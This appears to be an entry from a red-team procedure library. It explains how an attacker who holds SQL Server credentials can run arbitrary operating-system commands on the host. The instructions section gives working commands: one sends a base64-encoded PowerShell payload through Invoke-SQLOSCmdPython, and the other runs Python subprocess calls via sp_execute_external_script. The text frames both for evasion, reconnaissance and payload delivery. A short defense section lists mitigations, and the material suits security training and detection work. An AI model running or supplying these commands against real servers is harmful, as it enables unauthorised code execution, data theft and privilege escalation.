---
id: 659229c7-a1fa-4091-aa60-288e248d3080
name: MSSQL-Execute-Python-and-PowerShell-Scripts
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:20.607808+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command and Scripting Interpreter/T1059.001 -
    PowerShell|T1059.001]]
  - >-
    [[techniques/Command and Scripting Interpreter/T1059.006 -
    Python|T1059.006]]
sub_techniques: []
tags:
  - '[[tags/MSSQL Server]]'
  - '[[tags/Python]]'
  - '[[tags/PowerShell]]'
commands:
  - '[[commands/mssql-invoke-sqloscmdpython-powershell-execution]]'
  - '[[commands/mssql-sp-execute-external-script-python]]'
platforms:
  - Windows
tools: []
validated: true
---

# MSSQL-Execute-Python-and-PowerShell-Scripts

## Summary

This procedure enables execution of PowerShell scripts and Python code on a Microsoft SQL Server instance using built-in features like custom PowerShell functions for OS commands and the sp_execute_external_script stored procedure. It allows attackers with SQL access to run arbitrary system commands, facilitating data exfiltration, privilege escalation, or lateral movement while evading direct shell access restrictions.

## Description

In scenarios where an attacker has obtained SQL Server credentials (e.g., via SQL injection or credential dumping), this technique leverages SQL Server's external script execution capabilities. PowerShell execution uses a custom function like Invoke-SQLOSCmdPython to invoke base64-encoded PowerShell payloads, while Python execution relies on sp_execute_external_script, which requires the external scripts feature to be enabled on the server. This approach is useful in database-heavy environments for bypassing application-layer controls, executing reconnaissance (e.g., whoami), or deploying further payloads. Success depends on the SQL login having sysadmin privileges or equivalent to run external scripts.

## Requirements

1. Valid SQL Server credentials with sysadmin privileges or permissions to execute external scripts.
2. SQL Server instance with external script execution enabled (via sp_configure 'external scripts enabled', 1; RECONFIGURE;).
3. Network access to the SQL Server port (default 1433).
4. PowerShell environment on the attacker's machine to prepare base64-encoded scripts; Python libraries (e.g., pandas) installed on the SQL Server for Python execution.

## Defense

- Disable external script execution on SQL Server using sp_configure 'external scripts enabled', 0; RECONFIGURE; and monitor configuration changes.
- Implement principle of least privilege: Avoid granting sysadmin to non-admin users and audit SQL logins regularly.
- Enable SQL Server auditing for stored procedure executions (e.g., sp_execute_external_script) and review logs for anomalous script runs.
- Use database activity monitoring (DAM) tools to detect unusual command executions like subprocess calls or PowerShell invocations from SQL contexts.
- Segment SQL Servers from the internal network and restrict outbound connections from the server.

## Objectives

1. Execute arbitrary PowerShell commands on the SQL Server host to perform system-level actions.
2. Run Python scripts within the SQL Server process for data manipulation or OS interactions.
3. Achieve code execution on the target host without direct remote shell access, enabling persistence or escalation.

## Instructions

### Step 1: Prepare and Execute PowerShell Script via Invoke-SQLOSCmdPython

**Context**: Encode your PowerShell payload in base64 to obfuscate it, then use the Invoke-SQLOSCmdPython function to execute OS commands through SQL Server. This step assumes the function is available or loaded in your PowerShell session (often from SQL Server management scripts or custom modules). It allows running system commands disguised as SQL operations.

**Command** ([[commands/mssql-invoke-sqloscmdpython-powershell-execution]]):
```powershell
Invoke-SQLOSCmdPython -Username $_USERNAME -Password $_PASSWORD -Instance "$_INSTANCE" -Command "powershell -e $_BASE64_ENCODED_SCRIPT" -Verbose
```

> This command connects to the SQL Server instance and executes the base64-decoded PowerShell script, which can perform actions like file reads or network calls. Replace placeholders with actual values (e.g., $_USERNAME = 'sa', $_BASE64_ENCODED_SCRIPT = base64 of 'whoami'). Verbose mode provides execution feedback. Expected output includes the results of the PowerShell command piped back through SQL, such as user context or error messages if privileges are insufficient.

### Step 2: Execute Python Script via sp_execute_external_script

**Context**: Use SQL Server's built-in stored procedure to run Python code directly within the database engine. This is ideal for scripts that interact with data (e.g., querying tables) or spawn subprocesses for OS commands. Ensure the Python runtime is configured on the server; the script runs in a sandboxed environment but can escape via subprocess.

**Command** ([[commands/mssql-sp-execute-external-script-python]]):
```sql
EXEC sp_execute_external_script @language =N'Python', @script=N'import subprocess; p = subprocess.Popen("$_OS_COMMAND", stdout=subprocess.PIPE); OutputDataSet = pandas.DataFrame([str(p.stdout.read(), "utf-8")])' WITH RESULT SETS (([cmd_out] nvarchar(max)))
```

> This SQL command executes the Python script, capturing output from the OS command (e.g., $_OS_COMMAND = 'cmd.exe /c whoami'). The pandas DataFrame formats the result for SQL return. Expected output is a result set with the command's stdout (e.g., 'sqlserver\sa'). If pandas is unavailable or external scripts disabled, it will error with configuration messages. Use this for targeted reconnaissance or payload delivery.
